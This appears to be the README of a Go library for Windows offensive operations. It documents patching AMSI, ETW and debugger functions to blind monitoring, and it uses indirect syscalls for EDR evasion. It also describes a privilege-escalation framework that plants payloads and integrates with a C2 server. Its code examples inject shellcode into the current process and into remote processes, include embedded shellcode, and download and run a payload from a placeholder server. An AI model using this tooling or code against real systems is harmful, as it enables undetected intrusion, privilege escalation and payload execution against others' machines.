**Event Tracing for Windows (ETW)** is a Windows logging mechanism that records system events. The library provides `PatchETW()` function to disable event logging.

#### How it Works

1. **ntdll.dll Location**: Uses existing module resolution to find `ntdll.dll`
2. **Function Resolution**: Locates `EtwEventWrite` using PE parsing
3. **Memory Patching**: Overwrites function with `xor eax, eax; ret` instruction
4. **Event Logging Disabled**: No ETW events generated by current process

#### Usage

```go
// Patch ETW before performing operations to prevent event logging
err := winapi.PatchETW()
if err != nil {
    fmt.Printf("ETW patch failed: %v\n", err)
}
```

#### Expected Behavior

- **Success**: ETW event logging is disabled for the current process
- **Highly Reliable**: `ntdll.dll` is always loaded, making this patch very consistent
- **System Impact**: Only affects the current process, not system-wide

### Debug Protection Bypasses

#### DbgUiRemoteBreakin Bypass

**DbgUiRemoteBreakin** is the Windows API function used for remote debugger attachment. Patching this function prevents external debuggers from attaching to the process.

```go
// Prevent remote debugger attachment
err := winapi.PatchDbgUiRemoteBreakin()
if err != nil {
    fmt.Printf("DbgUiRemoteBreakin patch failed: %v\n", err)
}
```

**Patch Details**: Overwrites function with single `ret` instruction (0xC3)

#### NtTraceEvent Bypass

**NtTraceEvent** is used for trace event logging and debugging. Disabling this function prevents trace-based monitoring and analysis.

```go
// Prevent trace event logging
err := winapi.PatchNtTraceEvent()
if err != nil {
    fmt.Printf("NtTraceEvent patch failed: %v\n", err)
}
```

**Patch Details**: Overwrites function with `xor eax, eax; ret` (0x31, 0xC0, 0xC3)

#### NtSystemDebugControl Bypass

**NtSystemDebugControl** provides system-level debug control operations. Patching this function prevents kernel debugging interfaces from being used.

```go
// Prevent debug control operations
err := winapi.PatchNtSystemDebugControl()
if err != nil {
    fmt.Printf("NtSystemDebugControl patch failed: %v\n", err)
}
```

**Patch Details**: Overwrites function with `xor eax, eax; ret` (0x31, 0xC0, 0xC3)

### Convenience Functions

#### Apply All Patches

For convenience, the library provides functions to apply multiple patches at once:

```go
// Apply all available security patches
successful, failed := winapi.ApplyAllPatches()

fmt.Printf("Successfully applied patches: %v\n", successful)
for name, err := range failed {
    fmt.Printf("Failed to apply %s: %v\n", name, err)
}
```

#### Apply Critical Patches Only

```go
// Apply only the most important patches (AMSI and ETW)
successful, failed := winapi.ApplyCriticalPatches()

fmt.Printf("Applied %d critical patches\n", len(successful))
```

### Integration and Usage

The example application automatically applies all available patches at the optimal time:

1. **Process Enumeration**: Occurs before patching to avoid interference
2. **Process Selection**: User selects target process
3. **Security Bypass**: All six security patches are applied automatically
4. **Payload Injection**: Proceeds with comprehensive security bypass active

#### Example Output

```
go-native-syscalls $ ./your_program_with_applyall.exe 
Disabling security mechanisms...
Patching NtSystemDebugControl... SUCCESS
Patching ETW... SUCCESS
Patching DbgUiRemoteBreakin... SUCCESS
Patching NtTraceEvent... SUCCESS
Patching AMSI... FAILED: amsi.dll not found (not loaded)
Successfully applied 5/6 security patches

```

#### Manual Integration

```go
package main

import (
    "fmt"
    winapi "github.com/carved4/go-native-syscall"
)

func main() {
    // Apply security bypasses before sensitive operations
    fmt.Println("Applying security bypasses...")
    
    if err := winapi.PatchAMSI(); err != nil {
        fmt.Printf("AMSI patch failed: %v\n", err)
    } else {
        fmt.Println("AMSI disabled successfully")
    }
    
    if err := winapi.PatchETW(); err != nil {
        fmt.Printf("ETW patch failed: %v\n", err)
    } else {
        fmt.Println("ETW disabled successfully")
    }
    
    // Proceed with your operations...
    // AMSI won't scan payloads, ETW won't log events
}
```

#### Important Considerations

**Timing**: ETW patching can interfere with some Windows APIs (like process enumeration), so patches should be applied after gathering system information but before sensitive operations.

**Scope**: Both patches only affect the current process. They do not provide system-wide bypass.

**Detection**: While these bypasses use direct syscalls and avoid common hooks, they still modify process memory and may be detected by advanced security solutions.

**Compatibility**: Both functions are designed to fail gracefully. AMSI patch failure is expected when `amsi.dll` isn't loaded. ETW patch failure is rare since `ntdll.dll` is always present.

## Privilege Escalation Features

The library includes a comprehensive privilege escalation framework consisting of two specialized modules: **Discovery** and **Exploitation**. These modules work together to identify and exploit Windows privilege escalation vectors using direct syscalls for stealth and reliability.

### Overview

The privilege escalation framework provides:

- **Automated Discovery**: Scans the system for exploitable privilege escalation vectors
- **Structured Results**: Returns categorized vulnerabilities with detailed metadata
- **Multiple Attack Vectors**: Supports binary planting, service exploitation, and more
- **Clean Integration**: Simple library functions ready for C2 framework integration
- **Silent Operation**: No verbose output, designed for production red team use
- **Flexible Payloads**: Works with any custom payload or shellcode

### Discovery Module (`winapi_privesc.go`)

The discovery module identifies privilege escalation opportunities across the Windows system.

#### Key Functions

**`ScanPrivilegeEscalationVectors() (PrivEscMap, EscalationSummary, error)`**
- Comprehensive system scan for privilege escalation vectors
- Returns structured map of categorized vulnerabilities
- Includes summary statistics and severity analysis

**`ScanDirectoryPermissions(path string) ([]EscalationVector, error)`**  
- Analyzes file/directory permissions for weak ACLs
- Identifies writable system directories
- Detects binary planting opportunities

**`ScanServicePaths() ([]EscalationVector, error)`**
- Enumerates Windows services for unquoted path vulnerabilities
- Identifies service binaries with weak permissions
- Finds service replacement opportunities

**`ScanRegistryPersistence() ([]EscalationVector, error)`**
- Scans registry for persistence mechanisms
- Identifies writable autorun keys
- Detects service configuration vulnerabilities

#### Usage Example

```go
package main

import (
    "fmt"
    "log"
    
    winapi "github.com/carved4/go-native-syscall"
)

func main() {
    // Scan for privilege escalation vectors
    vectors, summary, err := winapi.ScanPrivilegeEscalationVectors()
    if err != nil {
        log.Fatal("Scan failed:", err)
    }
    
    // Display summary
    fmt.Printf("Found %d high-severity vectors across %d categories\n", 
        summary.HighSeverityCount, len(vectors))
    
    // Process specific attack vectors
    if pathVectors, exists := vectors["Binary Planting"]; exists {
        fmt.Printf("Binary Planting opportunities: %d\n", len(pathVectors))
        for _, vector := range pathVectors {
            fmt.Printf("  - %s (Severity: %s)\n", vector.Path, vector.Severity)
        }
    }
    
    // Check for service replacement opportunities
    if serviceVectors, exists := vectors["Service Replacement"]; exists {
        fmt.Printf("Service replacement opportunities: %d\n", len(serviceVectors))
    }
}
```

### Exploitation Module (`winapi_exp.go`)

The exploitation module provides functions to exploit discovered privilege escalation vectors.

#### Key Functions

**`ExploitVectors(vectors PrivEscMap, payload []byte, options ExploitOptions) (ExploitSession, error)`**
- Universal exploitation interface for all vector types
- Accepts custom payloads and configuration options
- Returns detailed exploitation results



**`ExploitBinaryPlanting(vector EscalationVector, payload []byte) (ExploitResult, error)`**
- Exploits PATH directory hijacking
- Plants executable in PATH directory
- Waits for legitimate execution

**`AutoExploit(vectors PrivEscMap, payload []byte) (ExploitSession, error)`**
- Automatically exploits high-priority vectors
- Prioritizes most reliable attack methods
- Provides comprehensive exploitation attempt

#### Usage Example

```go
package main

import (
    "fmt"
    winapi "github.com/carved4/go-native-syscall"
)

func main() {
    // Your custom payload
    payload := []byte{/* your shellcode or executable */}
    
    // Discover vectors
    vectors, _, err := winapi.ScanPrivilegeEscalationVectors()
    if err != nil {
        fmt.Printf("Discovery failed: %v\n", err)
        return
    }
    
    // Configure exploitation options
    options := winapi.ExploitOptions{
        TestMode:     false,  // Set to true for testing without real payloads
        MaxAttempts:  3,      // Retry failed exploits
        DelayBetween: 1000,   // Milliseconds between attempts
    }
    
    // Exploit discovered vectors
    session, err := winapi.ExploitVectors(vectors, payload, options)
    if err != nil {
        fmt.Printf("Exploitation failed: %v\n", err)
        return
    }
    
    // Display results
    fmt.Printf("Exploitation completed: %d/%d successful\n", 
        session.SuccessCount, session.TotalAttempts)
    
    // Check specific results
    for method, results := range session.Results {
        successCount := 0
        for _, result := range results {
            if result.Success {
                successCount++
            }
        }
        fmt.Printf("%s: %d/%d successful\n", method, successCount, len(results))
    }
}
```

### Integration with Your Projects

#### Simple Discovery and Exploitation

```go
// Basic usag discover and exploit in one function
func QuickPrivEsc(payload []byte) error {
    // Discover vectors
    vectors, summary, err := winapi.ScanPrivilegeEscalationVectors()
    if err != nil {
        return err
    }
    
    if summary.HighSeverityCount == 0 {
        return fmt.Errorf("no high-severity vectors found")
    }
    
    // Auto-exploit high-priority vectors
    session, err := winapi.AutoExploit(vectors, payload)
    if err != nil {
        return err
    }
    
    if session.SuccessCount == 0 {
        return fmt.Errorf("all exploitation attempts failed")
    }
    
    return nil
}
```

#### Advanced C2 Integration

```go
// C2 Framework integration example
type C2PrivEsc struct {
    client     *C2Client
    discovered bool
    vectors    winapi.PrivEscMap
}

func (c *C2PrivEsc) DiscoverVectors() error {
    vectors, summary, err := winapi.ScanPrivilegeEscalationVectors()
    if err != nil {
        return err
    }
    
    c.vectors = vectors
    c.discovered = true
    
    // Report to C2 server
    c.client.SendReport("privesc_discovery", summary)
    return nil
}

func (c *C2PrivEsc) ExploitOnDemand(method string, payload []byte) error {
    if !c.discovered {
        return fmt.Errorf("must discover vectors first")
    }
    
    // Exploit specific method
    if vectors, exists := c.vectors[method]; exists {
        for _, vector := range vectors {
            result, err := c.exploitVector(vector, payload)
            if err == nil && result.Success {
                c.client.SendSuccess("privesc_exploit", result)
                return nil
            }
        }
    }
    
    return fmt.Errorf("exploitation failed for method: %s", method)
}
```

#### Red Team Automation

```go
// Automated red team workflow
func AutomatedPrivEsc() {
    // Step 1: Reconnaissance  
    vectors, summary, err := winapi.ScanPrivilegeEscalationVectors()
    if err != nil {
        log.Printf("[!] Discovery failed: %v", err)
        return
    }
    
    log.Printf("[+] Discovered %d vectors across %d categories", 
        summary.TotalVectors, len(vectors))
    
    // Step 2: Download payload from C2
    payload, err := downloadFromC2("latest_payload")
    if err != nil {
        log.Printf("[!] Payload download failed: %v", err)
        return
    }
    
    // Step 3: Exploitation with preference order
    preferredMethods := []string{
        "Binary Planting",      // Most reliable
        "Task Scheduler",       // Good persistence
        "Service Replacement",  // System-level access
    }
    
    for _, method := range preferredMethods {
        if exploitMethod(vectors, method, payload) {
            log.Printf("[+] Successfully exploited via %s", method)
            reportSuccess(method)
            return
        }
    }
    
    log.Printf("[!] All exploitation methods failed")
}
```

### Data Structures

#### EscalationVector
Represents a single privilege escalation opportunity:

```go
type EscalationVector struct {
    Type        string    // "Binary Planting", "Service Replacement", etc.
    Path        string    // Target file/directory path
    Severity    string    // "High", "Medium", "Low"  
    Description string    // Human-readable description
    Method      string    // Specific exploitation method
    Metadata    map[string]interface{} // Additional context
}
```

#### PrivEscMap
Categorized map of privilege escalation vectors:

```go
type PrivEscMap map[string][]EscalationVector
// Categories: "Binary Planting", "Task Scheduler", "Service Replacement", etc.
```

#### ExploitResult
Result of a single exploitation attempt:

```go
type ExploitResult struct {
    Success     bool      // Whether exploitation succeeded
    Vector      EscalationVector // Original vector that was exploited
    Method      string    // Exploitation method used
    Error       string    // Error message if failed
    Timestamp   time.Time // When exploitation was attempted
    PayloadPath string    // Where payload was planted
}
```

### Important Usage Notes

#### Testing vs Production
- **Test Mode**: Use `ExploitOptions{TestMode: true}` to validate vectors without deploying real payloads
- **Production Mode**: Set `TestMode: false` for actual exploitation with your payloads

#### Payload Requirements
- **Binary Planting**: Requires executable payloads (.exe files)  
- **Task Scheduler**: Works with any executable format
- **Service Replacement**: Requires service-compatible executables

#### Operational Security
- All operations use direct syscalls for stealth
- No verbose logging in production mode
- Automatic cleanup of failed exploitation attempts
- Structured results prevent information leakage

#### Error Handling
- Functions return detailed error information
- Graceful handling of access denied scenarios
- Continues operation even if some vectors fail
- Comprehensive logging available in debug mode

This privilege escalation framework provides enterprise-grade capabilities for red team operations

## Build Requirements

### Prerequisites
- **Go 1.20+** (standard Go toolchain only)
- **Windows x64** target architecture

### Build Process

Simple Go build - no external dependencies required:

```bash
# build
go build

# cross-compile for Windows from other platforms
GOOS=windows GOARCH=amd64 go build
```

##  How It Works

### Architecture

**Direct Syscalls:**
```
Your Go Code
     ↓
Library Interface (winapi.go)
     ↓
Hash Resolution (obf package)
     ↓
PE Parsing (syscallresolve package)
     ↓
Go Assembly Bridge (syscall package)
     ↓
Plan9 Assembly (syscall_windows_amd64.s)
     ↓
Direct Syscall Instruction
     ↓
Windows NT Kernel
```

**Indirect Syscalls:**
```
Your Go Code
     ↓
Library Interface (winapi_indirect.go)
     ↓
Hash Resolution (obf package)
     ↓
PE Parsing (syscallresolve package)
     ↓
Go Assembly Bridge (syscall package)
     ↓
Plan9 Assembly (syscall_windows_amd64.s)
     ↓
Jump to ntdll.dll Syscall Instruction
     ↓
Windows NT Kernel
```

### Direct Syscall Flow

1. **Function Name** → **Hash** (DBJ2 algorithm)
2. **PEB Walking** → Find NTDLL base address (no LoadLibrary)
3. **PE Parsing** → Find function address (no GetProcAddress)
4. **Memory Reading** → Extract syscall number from function stub
5. **Assembly Call** → Execute raw `syscall` instruction
6. **Return** → NTSTATUS result

### Indirect Syscall Flow

1. **Function Name** → **Hash** (DBJ2 algorithm)
2. **PEB Walking** → Find NTDLL base address (no LoadLibrary)
3. **PE Parsing** → Find function address (no GetProcAddress)
4. **Memory Reading** → Extract syscall number from function stub
5. **Assembly Jump** → Jump to `syscall` instruction in ntdll.dll
6. **Return** → NTSTATUS result

The key difference is that indirect syscalls jump to the existing syscall instruction in ntdll rather than executing a raw syscall instruction. This provides enhanced stealth because:

- **EDR Evasion**: Many EDR products monitor for raw syscall instructions but allow calls that originate from within ntdll
- **Call Stack Legitimacy**: The call stack shows ntdll.dll as the caller, appearing more legitimate
- **Hook Compatibility**: Works even when userland hooks are present since it uses the hooked functions as trampolines
- **Reduced Signatures**: Avoids direct syscall instruction patterns that security products may flag

### Assembly Functions

The core assembly functions are implemented in Go's Plan9 assembly syntax in `pkg/syscall/syscall_windows_amd64.s`:

**Direct Syscall Function:**
```assembly
TEXT ·do_syscall(SB), $0-56
    XORQ AX,AX
    MOVW callid+0(FP), AX
    PUSHQ CX
    // Parameter setup and syscall execution
    SYSCALL
    // Return value handling
    RET
```

**Indirect Syscall Function:**
>from acheron
```assembly
TEXT ·do_syscall_indirect(SB),NOSPLIT,$0-40
    XORQ    AX, AX
    MOVW    ssn+0(FP), AX
    // Trampoline resolution and jump to ntdll
    CALL    R11  // Jump to clean syscall;ret gadget
    RET
```

**Trampoline Discovery Function:**
>from acheron
```assembly
TEXT ·getTrampoline(SB),NOSPLIT,$0-8
    // Searches for clean 0x0f05c3 (syscall;ret) gadgets
    // Returns address of clean syscall instruction
    RET
```

## Use Cases

### Security Research
- Bypass API hooks and monitoring
- Analyze Windows internals
- Test EDR/AV evasion techniques

### System Programming
- Low-level Windows operations
- Custom memory management
- Process manipulation
- File system operations

### Stealth Operations
- Avoid API call detection

## Using the WinAPI Library

The `winapi` package provides a high-level interface for Windows syscalls with proper type safety and error handling. Here's how to use it effectively:

### Basic Memory Operations

```go
package main

import (
    "fmt"
    "unsafe"
    
    "github.com/carved4/go-native-syscall"
)

func main() {
    // Get current process handle
    currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
    
    // Allocate memory
    var baseAddress uintptr
    size := uintptr(4096)
    
    status, err := winapi.NtAllocateVirtualMemory(
        currentProcess,
        &baseAddress,
        0,
        &size,
        0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
        0x04,          // PAGE_READWRITE
    )
    
    if err != nil || status != 0 {
        panic(fmt.Sprintf("Failed to allocate memory: 0x%X", status))
    }
    
    fmt.Printf("Allocated memory at: 0x%X\n", baseAddress)
    
    // Write data to memory
    data := []byte("Hello, World!")
    var bytesWritten uintptr
    
    status, err = winapi.NtWriteVirtualMemory(
        currentProcess,
        baseAddress,
        unsafe.Pointer(&data[0]),
        uintptr(len(data)),
        &bytesWritten,
    )
    
    if status == 0 {
        fmt.Printf("Wrote %d bytes successfully\n", bytesWritten)
    }
    
    // Read data back
    buffer := make([]byte, len(data))
    var bytesRead uintptr
    
    status, err = winapi.NtReadVirtualMemory(
        currentProcess,
        baseAddress,
        unsafe.Pointer(&buffer[0]),
        uintptr(len(buffer)),
        &bytesRead,
    )
    
    if status == 0 {
        fmt.Printf("Read back: %s\n", string(buffer))
    }
}
```

### Process Manipulation

```go
// Open a process by PID
var processHandle uintptr
pid := uintptr(1234) // Target process ID

// Create CLIENT_ID structure
clientId := struct {
    UniqueProcess uintptr
    UniqueThread  uintptr
}{
    UniqueProcess: pid,
    UniqueThread:  0,
}

status, err := winapi.NtOpenProcess(
    &processHandle,
    0x1F0FFF, // PROCESS_ALL_ACCESS
    0,        // No object attributes
    uintptr(unsafe.Pointer(&clientId)),
)

if status == 0 {
    fmt.Printf("Opened process handle: 0x%X\n", processHandle)
    
    // Don't forget to close the handle
    defer winapi.NtClose(processHandle)
}
```

### Thread Creation and Injection

#### Self-Injection Examples

The library provides `NtInjectSelfShellcode` for complete shellcode self-injection using only direct syscalls. This function includes a smart memory compatibility layer that optimizes for performance while providing fallback for reliability:

**PROBLEM:**
Go's garbage collector allocates byte slices in virtual memory regions that Windows NT syscalls (specifically NtWriteVirtualMemory) sometimes refuse to read from, causing intermittent STATUS_INVALID_PARAMETER (0x8000000D) errors. The same shellcode payload may work on one run and fail on the next, depending on where Go places it in memory.

**SOLUTION:**
1. **First attempt**: Try direct injection from Go memory → execution buffer (single copy, fastest)
2. **Fallback only if needed**: Allocate "syscall-friendly" memory using NtAllocateVirtualMemory
3. **Fallback process**: Copy shellcode Go memory → Windows memory → execution buffer (double copy)
4. **Always cleanup**: Free allocated memory and close handles

This pattern provides **optimal performance** in the common case (single memory copy) while maintaining **100% reliability** through the fallback mechanism. Most executions will use the fast path with only one `NtWriteVirtualMemory` call.

The function performs the complete injection process:

**Fast Path (Direct Injection - Most Common):**
1. **RW Memory**: Uses `NtAllocateVirtualMemory` with `PAGE_READWRITE` for target memory
2. **Copy Shellcode**: Uses `NtWriteVirtualMemory` to copy directly from Go memory to target
3. **Protection**: Changes target memory to `PAGE_EXECUTE_READ` with `NtProtectVirtualMemory`
4. **Execution**: Creates thread with `NtCreateThreadEx` (true direct syscall)
5. **Monitoring**: Waits for thread completion with `NtWaitForSingleObject`
6. **Cleanup**: Closes handles with `NtClose`

**Fallback Path (Safe Memory - Only When Needed):**
1. **Safe Memory**: Allocates "syscall-friendly" memory region using `NtAllocateVirtualMemory`
2. **Copy to Safe**: Uses `NtWriteVirtualMemory` to copy Go memory → Windows memory
3. **Target Memory**: Allocates execution memory with `PAGE_READWRITE`
4. **Copy to Target**: Uses `NtWriteVirtualMemory` to copy Windows memory → execution buffer
5. **Protection**: Changes target memory to `PAGE_EXECUTE_READ` with `NtProtectVirtualMemory`
6. **Execution**: Creates thread with `NtCreateThreadEx`
7. **Cleanup**: Frees both memory regions and closes handles

All operations use **only direct syscalls** and no Win32 API dependencies!

#### Remote Injection Examples

The library also provides `NtInjectRemote` for complete remote process injection using only direct syscalls. This function follows the proven pattern used by traditional CreateRemoteThread techniques but implemented entirely with NT APIs.

**Important Note**: Remote injection can be finicky depending on the target process. Simple processes like `notepad.exe`, `cmd.exe`, or `calc.exe` work reliably. Modern browsers (Chrome, Firefox) and heavily sandboxed applications may fail due to security protections, different DLL base addresses, or missing runtime dependencies. Always test with simple target processes first.

**Example: Remote Injection**

```go
package main

import (
    "fmt"
    "unsafe"
    winapi "github.com/carved4/go-native-syscall"
)

func main() {
    // Prewarm syscall cache
    winapi.PrewarmSyscallCache()
    
    // Your shellcode bytes
    shellcode := []byte{/* your payload */}
    
    // Target process ID (get this from Task Manager or process enumeration)
    targetPID := uint32(1234)
    
    // Open target process
    var processHandle uintptr
    clientId := winapi.CLIENT_ID{
        UniqueProcess: uintptr(targetPID),
        UniqueThread:  0,
    }
    
    objAttrs := winapi.OBJECT_ATTRIBUTES{
        Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
    }
    
    // Use specific access rights (more reliable than PROCESS_ALL_ACCESS)
    desiredAccess := uintptr(winapi.PROCESS_CREATE_THREAD | 
                            winapi.PROCESS_VM_OPERATION | 
                            winapi.PROCESS_VM_WRITE | 
                            winapi.PROCESS_VM_READ | 
                            winapi.PROCESS_QUERY_INFORMATION)
    
    status, err := winapi.NtOpenProcess(
        &processHandle,
        desiredAccess,
        uintptr(unsafe.Pointer(&objAttrs)),
        uintptr(unsafe.Pointer(&clientId)),
    )
    
    if err != nil || status != winapi.STATUS_SUCCESS {
        fmt.Printf("Failed to open process: %v\n", err)
        return
    }
    defer winapi.NtClose(processHandle)
    
    // Perform remote injection
    err = winapi.NtInjectRemote(processHandle, shellcode)
    if err != nil {
        fmt.Printf("Remote injection failed: %v\n", err)
    } else {
        fmt.Println("Remote injection successful!")
    }
}
```

**What NtInjectRemote Does:**

1. **Allocates RW Memory**: Uses `NtAllocateVirtualMemory` with `PAGE_READWRITE` in target process
2. **Writes Shellcode**: Uses `NtWriteVirtualMemory` to copy payload to remote memory
3. **Changes Protection**: Uses `NtProtectVirtualMemory` to change memory to `PAGE_EXECUTE_READ`
4. **Creates Thread**: Uses `NtCreateThreadEx` to execute shellcode in target process
5. **Fire and Forget**: Closes thread handle immediately (like traditional CreateRemoteThread)

**Process Compatibility Notes:**
-  **Reliable**: notepad.exe, cmd.exe, calc.exe, simple desktop applications
-  **Situational**: PowerShell, Windows Terminal, some third-party applications  
-  **Problematic**: Chrome, Firefox, Edge (sandboxed), protected system processes

The success rate depends heavily on the target process architecture, security policies, and runtime environment. When in doubt, test with notepad.exe first.

**Example 1: Self-Injection with Embedded Shellcode**

```go
package main

import (
    "fmt"
    "strconv"
    winapi "github.com/carved4/go-native-syscall"
)

func main() {
    // Prewarm syscall cache for better performance
    winapi.PrewarmSyscallCache()
    
    // Embedded calc.exe shellcode (x64)
    hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
    
    // Convert hex string to bytes
    shellcode := make([]byte, len(hexString)/2)
    for i := 0; i < len(hexString); i += 2 {
        b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
        shellcode[i/2] = byte(b)
    }
    
    fmt.Printf("Injecting %d bytes of shellcode...\n", len(shellcode))
    
    // Perform self-injection using NtCreateThreadEx syscall
    err := winapi.NtInjectSelfShellcode(shellcode)
    if err != nil {
        fmt.Printf("Self-injection failed: %v\n", err)
    } else {
        fmt.Println("Self-injection completed successfully!")
    }
}
```

**Example 2: Self-Injection with Downloaded Shellcode**

```go
package main

import (
    "fmt"
    "io"
    "net/http"
    "time"
    winapi "github.com/carved4/go-native-syscall"
)

func downloadShellcode(url string) ([]byte, error) {
    client := &http.Client{Timeout: 30 * time.Second}
    
    resp, err := client.Get(url)
    if err != nil {
        return nil, fmt.Errorf("download failed: %v", err)
    }
    defer resp.Body.Close()
    
    if resp.StatusCode != http.StatusOK {
        return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
    }
    
    payload, err := io.ReadAll(resp.Body)
    if err != nil {
        return nil, fmt.Errorf("failed to read payload: %v", err)
    }
    
    return payload, nil
}

func main() {
    // Prewarm syscall cache
    winapi.PrewarmSyscallCache()
    
    // Download shellcode from remote server
    url := "https://your-server.com/payload.bin"
    fmt.Printf("Downloading shellcode from: %s\n", url)
    
    shellcode, err := downloadShellcode(url)
    if err != nil {
        fmt.Printf("Failed to download shellcode: %v\n", err)
        return
    }
    
    fmt.Printf("Downloaded %d bytes of shellcode\n", len(shellcode))
    
    // Inject the downloaded shellcode into current process
    err = winapi.NtInjectSelfShellcode(shellcode)
    if err != nil {
        fmt.Printf("Self-injection failed: %v\n", err)
    } else {
        fmt.Println("Self-injection completed successfully!")
    }
}
```

**Example 3: Using Command-Line Tool (Pre-built)**

```bash
# Self-injection with embedded calc shellcode
./go-native-syscall.exe -example

# Self-injection with downloaded shellcode  
./go-native-syscall.exe -url https://your-server.com/payload.bin -self

# Remote injection into another process (shows process selection menu)
./go-native-syscall.exe -url https://your-server.com/payload.bin

# Scan for privilege escalation vectors (safe mode - no files created)
./go-native-syscall.exe -privesc
```

**What NtInjectSelfShellcode Does:**

1. **Memory Safety**: Allocates "syscall-friendly" memory region to avoid Go GC issues
2. **Memory Copy**: Copies shellcode from Go memory to safe Windows-allocated memory
3. **RW Memory**: Uses `NtAllocateVirtualMemory` with `PAGE_READWRITE` for target memory
4. **Copy Shellcode**: Uses `NtWriteVirtualMemory` to copy from safe memory to target
5. **Protection**: Changes target memory to `PAGE_EXECUTE_READ` with `NtProtectVirtualMemory`
6. **Execution**: Creates thread with `NtCreateThreadEx` (true direct syscall)
7. **Monitoring**: Waits for thread completion with `NtWaitForSingleObject`
8. **Cleanup**: Frees allocated memory and closes handles with `NtClose`

All operations use **only direct syscalls** - no Win32 API dependencies! The memory compatibility layer ensures 100% reliability across different Go garbage collector behaviors.

```go
// Simple self-injection wrapper (minimal example)
func SelfInject() error {
    shellcode := []byte{0x50, 0x51, 0x52, /* ... your shellcode ... */}
    return winapi.NtInjectSelfShellcode(shellcode)
}

// Manual remote injection for educational purposes
func InjectShellcode(processHandle uintptr, shellcode []byte) error {
    // Allocate memory in target process
    var baseAddress uintptr
    size := uintptr(len(shellcode))
    
    status, err := winapi.NtAllocateVirtualMemory(
        processHandle,
        &baseAddress,
        0,
        &size,
        0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
        0x04,          // PAGE_READWRITE
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("allocation failed: 0x%X", status)
    }
    
    // Write shellcode
    var bytesWritten uintptr
    status, err = winapi.NtWriteVirtualMemory(
        processHandle,
        baseAddress,
        unsafe.Pointer(&shellcode[0]),
        uintptr(len(shellcode)),
        &bytesWritten,
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("write failed: 0x%X", status)
    }
    
    // Change protection to executable
    var oldProtect uintptr
    status, err = winapi.NtProtectVirtualMemory(
        processHandle,
        &baseAddress,
        &size,
        0x20, // PAGE_EXECUTE_READ
        &oldProtect,
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("protect failed: 0x%X", status)
    }
    
    // Create thread to execute shellcode
    var threadHandle uintptr
    status, err = winapi.NtCreateThreadEx(
        &threadHandle,
        0x1F03FF, // THREAD_ALL_ACCESS
        0,         // No object attributes
        processHandle,
        baseAddress, // Start address (our shellcode)
        0,           // No parameter
        0,           // No creation flags
        0,           // Zero bits
        0,           // Stack size
        0,           // Maximum stack size
        0,           // No attribute list
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("thread creation failed: 0x%X", status)
    }
    
    // Wait for thread completion
    timeout := uint64(5000 * 1000 * 10) // 5 seconds
    winapi.NtWaitForSingleObject(threadHandle, false, &timeout)
    winapi.NtClose(threadHandle)
    
    return nil
}
```

### Using Raw DirectSyscall for Any API

```go
// Call any NTDLL function directly by name
func QuerySystemInfo() {
    // SystemBasicInformation = 0
    var buffer [48]byte // SYSTEM_BASIC_INFORMATION size
    var returnLength uintptr
    
    status, err := winapi.DirectSyscall("NtQuerySystemInformation",
        0, // SystemBasicInformation
        uintptr(unsafe.Pointer(&buffer[0])),
        uintptr(len(buffer)),
        uintptr(unsafe.Pointer(&returnLength)),
    )
    
    if status == 0 {
        fmt.Printf("System info retrieved, %d bytes\n", returnLength)
    }
}

// Use function hash for obfuscation
func ObfuscatedCall() {
    hash := winapi.GetFunctionHash("NtQuerySystemInformation")
    
    status, err := winapi.DirectSyscallByHash(hash,
        0, // SystemBasicInformation
        // ... other args
    )
}
```

### Debug Logging

The library includes a comprehensive debug logging system that is **silent by default** for production use but can be enabled for development and troubleshooting:

**Enable Debug Mode:**

```bash
# Environment variable (affects all operations)
export DEBUG=true
# or
export WINAPI_DEBUG=true

# Command line flag (for the main application)
./go-native-syscall.exe -debug -example
```

**Programmatic Control:**

```go
import "github.com/carved4/go-native-syscall/pkg/debug"

// Enable debug logging
debug.SetDebugMode(true)

// Check if debug is enabled
if debug.IsDebugEnabled() {
    fmt.Println("Debug mode is active")
}

// Your syscall operations will now show debug output
err := winapi.NtInjectSelfShellcode(payload)
```

**Debug Output Example:**

```
[DEBUG WINAPI] Starting direct syscall self-injection of 105 bytes...
[DEBUG WINAPI] Step 1: Allocating 105 bytes of RW memory...
[DEBUG WINAPI] Allocated memory at: 0x1A2B3C4D5678
[DEBUG SYSCALLRESOLVE] Found ntdll.dll at: 0x7FF87D2F0000
[DEBUG WINAPI] Thread created successfully: 0x1234
```

**Environment Variables:**
- `DEBUG=true` - General debug mode
- `WINAPI_DEBUG=true` - Specific to WINAPI package
- `SYSCALLRESOLVE_DEBUG=true` - Specific to syscall resolution
- `SYSCALL_DEBUG=true` - General syscall debugging

### Error Handling

The library provides built-in NT status code formatting and validation functions for better error handling:

```go
// Using built-in status helpers (recommended)
status, err := winapi.NtAllocateVirtualMemory(/* args */)
if err != nil {
    log.Fatal("Syscall error:", err)
}

if !winapi.IsNTStatusSuccess(status) {
    log.Fatalf("NtAllocateVirtualMemory failed: %s", winapi.FormatNTStatus(status))
}

// Or check for specific error types
if winapi.IsNTStatusError(status) {
    fmt.Printf("Error occurred: %s\n", winapi.FormatNTStatus(status))
} else if winapi.IsNTStatusWarning(status) {
    fmt.Printf("Warning: %s\n", winapi.FormatNTStatus(status))
}
```

```go
// Custom error handling function using built-in helpers
func CheckNTStatus(status uintptr, operation string) error {
    if winapi.IsNTStatusSuccess(status) {
        return nil
    }
    return fmt.Errorf("%s failed: %s", operation, winapi.FormatNTStatus(status))
}

// Usage example
status, err := winapi.NtAllocateVirtualMemory(/* args */)
if err := CheckNTStatus(status, "NtAllocateVirtualMemory"); err != nil {
    log.Fatal(err)
}
```

### Important Notes

1. **Handle Management**: Always close handles with `NtClose()` when done
2. **Error Checking**: Check both the Go error and NTSTATUS return value
3. **Memory Safety**: Be careful with `unsafe.Pointer` conversions
4. **Debugging**: Use `GetSyscallNumber()` to verify function resolution
